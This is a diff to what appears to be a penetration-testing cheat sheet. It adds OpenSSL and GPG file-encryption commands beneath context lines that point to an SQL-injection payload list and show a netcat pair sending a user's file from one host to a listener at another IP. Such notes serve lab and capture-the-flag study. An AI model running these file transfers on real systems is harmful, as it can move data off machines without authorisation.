@@ -84,3 +84,10 @@ https://github.com/payloadbox/sql-injection-payload-list.git
 ### Netcat recv and send
 `nc -q 1 -l -p 7777 > runme`
 `nc -q 1 10.9.3.125 7777 < /home/catlover/runme`
+
+### Openssl & GPG
+`openssl aes-256-cbc -pbkdf2 -iter 10000 -e -in message.txt -out encrypted_message`
+`openssl aes-256-cbc -pbkdf2 -iter 10000 -d -in encrypted_message -out original_message.txt`
+
+`gpg --symmetric --cipher-algo CIPHER message.txt`
+`gpg --output original_message.txt --decrypt message.gpg`
